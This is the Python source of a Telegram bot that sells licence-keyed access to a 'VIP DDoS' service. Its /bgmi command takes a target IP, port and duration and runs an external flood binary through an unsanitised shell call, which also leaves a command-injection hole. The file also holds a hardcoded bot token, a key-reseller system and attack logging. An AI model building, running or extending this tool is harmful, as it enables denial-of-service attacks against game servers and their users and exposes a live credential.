import pytz
import json
import random
import string
import telebot
import datetime
import threading
import subprocess

# --- Configuration ---
bot = telebot.TeleBot('7782735970:AAGpmubo3p55TQjwapUi-Bq2XY0igX5wnbs')

# Admin user IDs
admin_id = {"7097659861"}  # Replace with actual admin ID

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"

# --- In-memory storage ---
users = {}
keys = {}
attack_cooldown = {}  # Track cooldown for each user

# --- Data Loading and Saving Functions ---
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

# --- Logging Functions ---
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "Logs cleared"
            else:
                file.truncate(0)
                return "Logs cleared"
    except FileNotFoundError:
        return "No data found"

# --- Utility Functions ---
def generate_key(length=10):
    characters = string.ascii_letters + string.digits
    key = ''.join(random.choice(characters) for _ in range(length))
    return f"𝗡𝗜𝗥𝗔𝗝-𝗩𝗜𝗣-{key.upper()}"  # Ensure key is in uppercase

def add_time_to_current_date(hours=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M:%S')

def convert_utc_to_ist(utc_time_str):
    utc_time = datetime.datetime.strptime(utc_time_str, '%Y-%m-%d %H:%M:%S')
    utc_time = utc_time.replace(tzinfo=pytz.utc)
    ist_time = utc_time.astimezone(pytz.timezone('Asia/Kolkata'))
    return ist_time.strftime('%Y-%m-%d %H:%M:%S')

# --- Command Handlers ---
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.chat.id)

    # Check if the user has any subscription or not
    if user_id in users:
        expiration_date = users[user_id]
        status = "𝗔𝗰𝘁𝗶𝘃𝗲 ✅" if datetime.datetime.now() < datetime.datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S') else "𝗜𝗻𝗮𝗰𝘁𝗶𝘃𝗲 ❌"
        response = f"⚡️𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗡𝗜𝗥𝗔𝗝 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦⚡️\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 @{message.chat.username}!\n🆔 𝗬𝗼𝘂𝗿 𝗜𝗗: {user_id}\n\n🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n• /bgmi - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n• /redeem - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n• /check - 𝗡𝗜𝗥𝗔𝗝 𝗦𝘆𝘀𝘁𝗲𝗺 𝗦𝘁𝗮𝘁𝘂𝘀\n\n💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n\n\n📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @NIRAJModzOwner\n━━━━━━━━━━━━━━━━━━━━━━━━━━"
    else:
        response = f"⚡️𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗡𝗜𝗥𝗔𝗝 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦⚡️\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 @{message.chat.username}!\n🆔 𝗬𝗼𝘂𝗿 𝗜𝗗: {user_id}\n\n🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n• /bgmi - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n• /redeem - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n• /check - 𝗡𝗜𝗥𝗔𝗝 𝗦𝘆𝘀𝘁𝗲𝗺 𝗦𝘁𝗮𝘁𝘂𝘀\n\n💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗜𝗻𝗮𝗰𝘁𝗶𝘃𝗲 ❌\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n\n\n📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @NIRAJModzOwner\n━━━━━━━━━━━━━━━━━━━━━━━━━━"

    bot.reply_to(message, response)

@bot.message_handler(commands=['genkey'])
def generate_key_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            try:
                time_amount = int(command[1])
                time_unit = command[2].lower()
                if time_unit not in ['hours', 'days']:
                    raise ValueError("Invalid time unit")

                # Store duration in hours
                duration_in_hours = time_amount if time_unit == 'hours' else time_amount * 24

                key = generate_key()
                keys[key] = duration_in_hours  # Store duration, not expiration date
                save_keys()

                response = f"✅ 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✅\n\n𝗞𝗲𝘆: `{key}`\n𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: {time_amount} {time_unit}"
            except ValueError:
                response = "𝗦𝗽𝗲𝗰𝗶𝗳𝘆 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿 𝗮𝗻𝗱 𝘁𝗶𝗺𝗲"
        else:
            response = "𝗨𝘀𝗮𝗴𝗲: /𝗴𝗲𝗻𝗸𝗲𝘆 <𝘁𝗶𝗺𝗲> <𝘂𝗻𝗶𝘁>"
    else:
        response = "𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗔𝗱𝗺𝗶𝗻 @NIRAJModzOwner"

    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_key_command(message):
    user_id = str(message.chat.id)
    if user_id in users:
        response = "❕𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀❕"
        bot.reply_to(message, response)
        return

    command = message.text.split()
    if len(command) == 2:
        key = command[1].upper()  # Ensure key is in uppercase
        if key in keys:
            duration_in_hours = keys[key]  # Get duration in hours
            current_time = datetime.datetime.now()

            # Redeem the key for the user
            new_expiration_time = current_time + datetime.timedelta(hours=duration_in_hours)
            users[user_id] = new_expiration_time.strftime('%Y-%m-%d %H:%M:%S')
            save_users()

            # Remove key after redemption
            del keys[key]
            save_keys()

            response = f"❇️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝘂𝗻𝘁𝗶𝗹: {convert_utc_to_ist(users[user_id])}"
        else:
            response = "📛 𝗞𝗲𝘆 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗼𝗿 𝗶𝗻𝘃𝗮𝗹𝗶𝗱 📛"
    else:
        response = "💎 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗠𝗣𝗧𝗜𝗢𝗡 💎\n━━━━━━━━━━━━━━━\n📝 𝗨𝘀𝗮𝗴𝗲: /redeem 𝗡𝗜𝗥𝗔𝗝-𝗩𝗜𝗣-𝗫𝗫𝗫𝗫\n\n⚠️ 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁 𝗡𝗼𝘁𝗲𝘀:\n• 𝗞𝗲𝘆𝘀 𝗮𝗿𝗲 𝗰𝗮𝘀𝗲-𝘀𝗲𝗻𝘀𝗶𝘁𝗶𝘃𝗲\n• 𝗢𝗻𝗲-𝘁𝗶𝗺𝗲 𝘂𝘀𝗲 𝗼𝗻𝗹𝘆\n• 𝗡𝗼𝗻-𝘁𝗿𝗮𝗻𝘀𝗳𝗲𝗿𝗮𝗯𝗹𝗲\n\n🔑 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /redeem 𝗡𝗜𝗥𝗔𝗝-𝗩𝗜𝗣-𝗔𝗕𝗖𝗗𝟭𝟮𝟯𝟰\n\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆? 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀/n━━━━━━━━━━━━━━━"

    bot.reply_to(message, response)


def attack_completed(user_id, target, port, time):
    # This function is used to send the attack completion message after the attack ends.
    bot.send_message(user_id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 👍 ")

def execute_attack(user_id, target, port, time):
    # This function is responsible for running the attack and notifying the user when done
    try:
        # Run the attack command
        full_command = f"./test {target} {port} {time} 900 "  # Replace with actual attack command
        subprocess.run(full_command, shell=True)

        # After attack is complete, notify the user
        attack_completed(user_id, target, port, time)
    except Exception as e:
        bot.send_message(user_id, f"❌ An error occurred while executing the attack: {str(e)} ❌")

@bot.message_handler(commands=['bgmi'])
def handle_attack(message):
    user_id = str(message.chat.id)
    cooldown_time = 120  # Cooldown in seconds (e.g., 60 seconds)

    # Check if the user has VIP access
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❗️𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱❗️"
            bot.reply_to(message, response)
            return

        # Check cooldown for user
        if user_id in attack_cooldown:
            last_attack_time = attack_cooldown[user_id]
            time_diff = (datetime.datetime.now() - last_attack_time).total_seconds()
            if time_diff < cooldown_time:
                remaining_time = cooldown_time - int(time_diff)
                response = f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {remaining_time} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀 ⌛️"
                bot.reply_to(message, response)
                return

        # Parsing the attack command
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            try:
                port = int(command[2])
                time = int(command[3])

                # Validate that port and time are within reasonable bounds
                if port < 10003 or port > 29999:
                    response = "Invalid port"
                elif time > 240:
                    response = "❕𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗶𝘀 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❕"
                else:
                    # Log the attack command
                    record_command_logs(user_id, '/attack', target, port, time)
                    log_command(user_id, target, port, time)

                    # Update cooldown
                    attack_cooldown[user_id] = datetime.datetime.now()

                    # Notify user that the attack has started
                    response = f"🚀𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗\n🎯𝗧𝗮𝗿𝗴𝗲𝘁: {target}\n🔌𝗣𝗼𝗿𝘁: {port}\n🕞𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n🔐𝗦𝘁𝗮𝘁𝘂𝘀: Attack in progress..."

                    # Execute the attack in a separate thread
                    threading.Thread(target=execute_attack, args=(user_id, target, port, time)).start()

            except ValueError:
                response = "Invalid port or time"
        else:
            response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
    else:
        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀\n🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗸𝗲𝘆:\n• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿\n📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟: ➡️ @NIRAJModzOwner"

    bot.reply_to(message, response)
    

@bot.message_handler(commands=['logs'])
def log_command_request(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file, caption="𝗹𝗼𝗴𝘀")
        except FileNotFoundError:
            bot.reply_to(message, "𝗡𝗼 𝗹𝗼𝗴𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲.")
    else:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")

@bot.message_handler(commands=['check'])
def check_subscription(message):
    user_id = str(message.chat.id)
    current_time = datetime.datetime.now()  # Get current UTC time
    current_time_ist = convert_utc_to_ist(current_time.strftime('%Y-%m-%d %H:%M:%S'))  # Convert to IST

    # Check if the user has any subscription
    if user_id in users:
        expiration_date = users[user_id]
        status = "𝗔𝗰𝘁𝗶𝘃𝗲 ✅" if current_time < datetime.datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S') else "𝗜𝗻𝗮𝗰𝘁𝗶𝘃𝗲 ❌"
        response = (
            f"⚡️ 𝗡𝗜𝗥𝗔𝗝 𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦 ⚡️\n━━━━━━━━━━━━━━━\n👤 𝗨𝘀𝗲𝗿: @{message.chat.username}\n🆔 𝗜𝗗: {user_id}\n\n💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻:\n• Status: {status}\n• Expires: {convert_utc_to_ist(expiration_date)}\n\n🖥️ 𝗦𝗲𝗿𝘃𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀:\n• Status: 🟢 SERVERS AVAILABLE\n• Ready for attacks\n\n⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗦𝘁𝗮𝘁𝘂𝘀:\n• Status: 🟢 Ready\n• Duration: 5 minutes per attack\n\n⏰ 𝗟𝗮𝘀𝘁 𝗨𝗽𝗱𝗮𝘁𝗲𝗱:\n• {current_time_ist}\n━━━━━━━━━━━━━━━"
        )
    else:
        response = (
            f"⚡️ 𝗡𝗜𝗥𝗔𝗝 𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦 ⚡️\n━━━━━━━━━━━━━━━\n👤 𝗨𝘀𝗲𝗿: @{message.chat.username}\n🆔 𝗜𝗗: {user_id}\n\n💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻:\n• Status: 𝗜𝗻𝗮𝗰𝘁𝗶𝘃𝗲 ❌\n• Expires: No active subscription\n\n🖥️ 𝗦𝗲𝗿𝘃𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀:\n• Status: 🟢 SERVERS AVAILABLE\n• Ready for attacks\n\n⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗦𝘁𝗮𝘁𝘂𝘀:\n• Status: 🟢 Ready\n• Duration: 5 minutes per attack\n\n⏰ 𝗟𝗮𝘀𝘁 𝗨𝗽𝗱𝗮𝘁𝗲𝗱:\n• {current_time_ist}\n━━━━━━━━━━━━━━━"
        )

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            target_user_id = command[1]
            if target_user_id in users:
                del users[target_user_id]  # Remove the user from the `users` dictionary
                save_users()  # Save updated user data to the file
                response = f"𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 👍"
            else:
                response = f"𝗨𝘀𝗲𝗿 {target_user_id} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗹𝗶𝘀𝘁"
        else:
            response = "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲 <𝘂𝘀𝗲𝗿_𝗶𝗱>"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['users'])
def list_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        # Generate the list of authorized users
        if users:
            response = "𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗨𝘀𝗲𝗿𝘀:\n"
            for uid, expiry in users.items():
                # Check if subscription is active
                status = "Active" if datetime.datetime.now() < datetime.datetime.strptime(expiry, '%Y-%m-%d %H:%M:%S') else "Expired"
                response += f"𝗨𝘀𝗲𝗿𝗜𝗗: {uid}\n𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {convert_utc_to_ist(expiry)}\n𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n\n"
        else:
            response = "𝗡𝗼 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱."
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"

    bot.reply_to(message, response)

# --- Initialization ---
if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            # Add a small delay to avoid rapid looping in case of persistent errors
    time.sleep(5)